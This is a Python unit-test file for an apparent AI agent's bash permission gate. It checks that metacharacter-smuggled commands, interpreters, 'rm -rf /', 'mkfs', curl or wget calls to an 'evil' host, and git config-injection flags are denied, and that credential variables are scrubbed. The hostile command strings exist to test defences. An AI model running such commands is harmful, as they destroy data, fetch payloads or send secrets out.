"""Unit tests for the bash gate (the load-bearing tiering surface).

Covers the spec's bash-gate bullet: an allowlisted command carrying
sub-execution metacharacters is **denied** (not prompted); an
un-allowlisted ``argv[0]`` is denied; the scrubbed env hides the
Anthropic key from a real subprocess; and a non-allowlisted command
passed through ``run_check`` is denied (same gate, no second path).
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest

from carve.core.agents.permissions.bash_gate import tier_bash_command
from carve.core.agents.permissions.gate import Outcome, PermissionGate
from carve.core.agents.permissions.modes import PermissionMode
from carve.core.agents.permissions.policy import build_policy
from carve.core.agents.tools.bash_tool import _scrubbed_env, make_bash_tool, run_bash
from carve.core.agents.verification import CheckDenied, CheckResult, run_check


def _build_rules(mode: PermissionMode):  # type: ignore[no-untyped-def]
    return build_policy(mode).bash


class TestMetacharacterDeny:
    def test_allowlisted_git_commit_with_command_substitution_denied(self) -> None:
        rules = _build_rules(PermissionMode.BUILD)
        decision = tier_bash_command('git commit -m "$(whoami)"', rules)
        assert decision.tier == "deny"
        assert "metacharacter" in decision.reason

    def test_allowlisted_git_commit_with_semicolon_denied(self) -> None:
        rules = _build_rules(PermissionMode.BUILD)
        decision = tier_bash_command("git commit -m ok; rm -rf /", rules)
        assert decision.tier == "deny"

    def test_allowlisted_git_commit_with_backtick_denied(self) -> None:
        rules = _build_rules(PermissionMode.BUILD)
        decision = tier_bash_command("git commit -m `id`", rules)
        assert decision.tier == "deny"

    def test_pipe_and_redirect_denied(self) -> None:
        rules = _build_rules(PermissionMode.BUILD)
        assert tier_bash_command("git status | grep foo", rules).tier == "deny"
        assert tier_bash_command("ls > out.txt", rules).tier == "deny"

    def test_clean_allowlisted_command_allowed(self) -> None:
        rules = _build_rules(PermissionMode.BUILD)
        decision = tier_bash_command('git commit -m "a clean message"', rules)
        assert decision.tier == "allow"


class TestArgvAllowlist:
    def test_unlisted_program_denied(self) -> None:
        rules = _build_rules(PermissionMode.BUILD)
        decision = tier_bash_command("mkfs /dev/sda", rules)
        assert decision.tier == "deny"
        assert "allow-list" in decision.reason or "denied" in decision.reason

    def test_shell_interpreter_denied_every_mode(self) -> None:
        for mode in PermissionMode:
            rules = _build_rules(mode)
            assert tier_bash_command("sh -c 'echo hi'", rules).tier == "deny"
            assert tier_bash_command("bash script.sh", rules).tier == "deny"

    def test_write_subcommand_denied_in_read_only(self) -> None:
        rules = _build_rules(PermissionMode.READ_ONLY)
        # git status is fine; git commit (write) is not on the read floor.
        assert tier_bash_command("git status", rules).tier == "allow"
        assert tier_bash_command("git commit -m x", rules).tier == "deny"

    def test_push_prompts_only_at_deploy(self) -> None:
        assert tier_bash_command("git push", _build_rules(PermissionMode.DEPLOY)).tier == (
            "prompt"
        )
        assert tier_bash_command("git push", _build_rules(PermissionMode.BUILD)).tier == (
            "deny"
        )


class TestAceBinariesDenied:
    """Interpreters / package managers / exec-search must NOT be reachable.

    Each of these is arbitrary-code-execution (or network egress) through
    its *own* argv — no shell metacharacter needed — so the metachar
    screen never sees them. They must be denied in **every** mode,
    including ``read_only`` (the explorer floor). Regression for the two
    Criticals + the egress High.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "python3 x.py",
            'python -c "__import__(\'os\').system(\'id\')"',
            "python2 x.py",
            "pip install evil",
            "pip3 install --index-url http://evil/ pkg",
            "find . -execdir cat {} +",
            "find . -name x -delete",
            "perl -e 'system(q{id})'",
            "ruby -e 'exec(%q{id})'",
            "node -e 'process.exit()'",
            "npm install evil",
            "npx cowsay hi",
            "curl http://evil/exfil",
            "wget http://evil/payload",
            "xargs cat",
            "awk 'BEGIN{system(\"id\")}'",
            "tee /etc/passwd",
            "env FOO=bar id",
        ],
    )
    @pytest.mark.parametrize(
        "mode",
        [
            PermissionMode.READ_ONLY,
            PermissionMode.PLAN,
            PermissionMode.BUILD,
            PermissionMode.DEPLOY,
        ],
    )
    def test_ace_and_egress_binaries_denied_every_mode(
        self, command: str, mode: PermissionMode
    ) -> None:
        rules = _build_rules(mode)
        assert tier_bash_command(command, rules).tier == "deny"

    def test_read_only_python_denied_at_gate(self) -> None:
        # End-to-end through the gate (read_only, no approver): the Critical
        # ACE path the report reproduced now denies.
        gate = PermissionGate(build_policy(PermissionMode.READ_ONLY))
        decision = gate.check("bash", {"command": "python3 payload.py"})
        assert decision.outcome is Outcome.DENY


class TestDangerousFlagDeny:
    """Multi-purpose tools stay allow-listed, but their config-injection /
    exec / repoint flags are rejected even with an allow-listed subcommand.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "git -c core.sshCommand=evil status",
            "git -c diff.external=evil diff",
            "git --exec-path=/tmp/evil status",
            "git diff --ext-diff",
            "git --upload-pack=evil status",
            "git -C /etc status",
            "dbt compile --project-dir /tmp/attacker",
            "dbt parse --profiles-dir /tmp/attacker",
            "dlt --version --project-dir /tmp/attacker",
        ],
    )
    def test_dangerous_flags_denied(self, command: str) -> None:
        # Use the widest mode so the *subcommand* itself is allow-listed;
        # the denial must come from the flag guard, not a missing allow.
        rules = _build_rules(PermissionMode.DEPLOY)
        decision = tier_bash_command(command, rules)
        assert decision.tier == "deny"

    def test_plain_subcommand_still_allowed(self) -> None:
        rules = _build_rules(PermissionMode.DEPLOY)
        assert tier_bash_command("git diff", rules).tier == "allow"
        assert tier_bash_command("git status", rules).tier == "allow"
        assert tier_bash_command("dbt compile", rules).tier == "allow"


class TestScrubbedEnv:
    def test_printenv_anthropic_key_is_empty(self, tmp_path: Path) -> None:
        # Even with the key set in the parent process, the subprocess env
        # is scrubbed of it.
        os.environ["ANTHROPIC_API_KEY"] = "sk-should-not-leak"
        try:
            result = run_bash("printenv ANTHROPIC_API_KEY", cwd=tmp_path)
        finally:
            del os.environ["ANTHROPIC_API_KEY"]
        # printenv exits non-zero and prints nothing when the var is unset.
        assert "sk-should-not-leak" not in result.stdout
        assert result.stdout.strip() == ""

    def test_no_credential_var_survives_into_subprocess(
        self, tmp_path: Path
    ) -> None:
        """The invariant: no credential-shaped var reaches the bash env.

        Plant a warehouse password, a ``*_TOKEN``, and a ``*_SECRET`` in
        ``os.environ`` and assert a live ``printenv`` in the subprocess
        sees none of their values — neither by full dump nor by name.
        """
        planted = {
            "PROD_SNOWFLAKE_PASSWORD": "hunter2-LEAKED",
            "SOME_API_TOKEN": "tok-LEAKED",
            "MY_CLIENT_SECRET": "sec-LEAKED",
            "AWS_SECRET_ACCESS_KEY": "aws-LEAKED",
            "DBT_PROFILE_KEY": "key-LEAKED",
        }
        for key, value in planted.items():
            os.environ[key] = value
        try:
            # Full dump (printenv with no arg lists the whole env).
            result = run_bash("printenv", cwd=tmp_path)
            for value in planted.values():
                assert value not in result.stdout
            # Named lookups return nothing (var absent → empty + nonzero).
            for key in planted:
                named = run_bash(f"printenv {key}", cwd=tmp_path)
                assert named.stdout.strip() == ""
        finally:
            for key in planted:
                del os.environ[key]

    def test_scrubbed_env_drops_credentials_keeps_path(self) -> None:
        # Unit-level: the scrub function itself enforces the invariant,
        # independent of any subprocess.
        os.environ["PROD_SNOWFLAKE_PASSWORD"] = "leak"
        os.environ["GITHUB_TOKEN"] = "leak"
        os.environ["X_PRIVATE_KEY"] = "leak"
        try:
            env = _scrubbed_env()
        finally:
            del os.environ["PROD_SNOWFLAKE_PASSWORD"]
            del os.environ["GITHUB_TOKEN"]
            del os.environ["X_PRIVATE_KEY"]
        assert "PROD_SNOWFLAKE_PASSWORD" not in env
        assert "GITHUB_TOKEN" not in env
        assert "X_PRIVATE_KEY" not in env
        # A neutral var the allowed tools need is still present.
        assert "PATH" in env

    def test_scrubbed_env_has_no_credential_shaped_keys(self) -> None:
        # Sweep whatever is in the real environment: nothing credential-
        # shaped may pass, even if it were somehow on the allowlist.
        import re

        cred_re = re.compile(
            r"(PASSWORD|SECRET|TOKEN|_KEY$|APIKEY|API_KEY|PRIVATE|"
            r"SNOWFLAKE|AWS|ANTHROPIC)",
            re.IGNORECASE,
        )
        for key in _scrubbed_env():
            assert not cred_re.search(key), f"credential-shaped var leaked: {key}"


class TestRunCheckUsesGate:
    def test_non_allowlisted_cmd_through_run_check_denied(self, tmp_path: Path) -> None:
        policy = build_policy(PermissionMode.BUILD)
        gate = PermissionGate(policy)
        bash_tool = make_bash_tool(tmp_path, gate=gate)

        def _parse(proc: subprocess.CompletedProcess[str]) -> CheckResult:
            return CheckResult(passed=proc.returncode == 0)

        try:
            run_check("mkfs /dev/sda", parse=_parse, bash_tool=bash_tool)
        except CheckDenied as exc:
            assert "denied" in str(exc).lower() or "allow-list" in str(exc)
        else:  # pragma: no cover - the call must raise
            raise AssertionError("run_check should have denied the command")

    def test_metachar_cmd_through_run_check_denied(self, tmp_path: Path) -> None:
        policy = build_policy(PermissionMode.BUILD)
        gate = PermissionGate(policy)
        bash_tool = make_bash_tool(tmp_path, gate=gate)

        def _parse(proc: subprocess.CompletedProcess[str]) -> CheckResult:
            return CheckResult(passed=True)

        try:
            run_check("echo hi; rm -rf /", parse=_parse, bash_tool=bash_tool)
        except CheckDenied:
            pass
        else:  # pragma: no cover
            raise AssertionError("run_check should have denied the metachar command")

    def test_allowlisted_cmd_through_run_check_runs(self, tmp_path: Path) -> None:
        policy = build_policy(PermissionMode.BUILD)
        gate = PermissionGate(policy)
        bash_tool = make_bash_tool(tmp_path, gate=gate)

        def _parse(proc: subprocess.CompletedProcess[str]) -> CheckResult:
            return CheckResult(passed=proc.returncode == 0, summary=proc.stdout.strip())

        result = run_check("echo verification-ok", parse=_parse, bash_tool=bash_tool)
        assert result.passed
        assert "verification-ok" in result.summary


class TestGateBashIntegration:
    def test_gate_denies_metachar_bash(self) -> None:
        gate = PermissionGate(build_policy(PermissionMode.BUILD))
        decision = gate.check("bash", {"command": "git commit -m `id`"})
        assert decision.outcome is Outcome.DENY

    def test_gate_prompt_tier_without_approver_needs_user_input(self) -> None:
        gate = PermissionGate(build_policy(PermissionMode.DEPLOY))
        decision = gate.check("bash", {"command": "git push"})
        assert decision.outcome is Outcome.NEEDS_USER_INPUT

    def test_gate_prompt_tier_with_approver_allows(self) -> None:
        gate = PermissionGate(build_policy(PermissionMode.DEPLOY))
        decision = gate.check(
            "bash", {"command": "git push"}, approver=lambda _n, _i: True
        )
        assert decision.outcome is Outcome.ALLOW
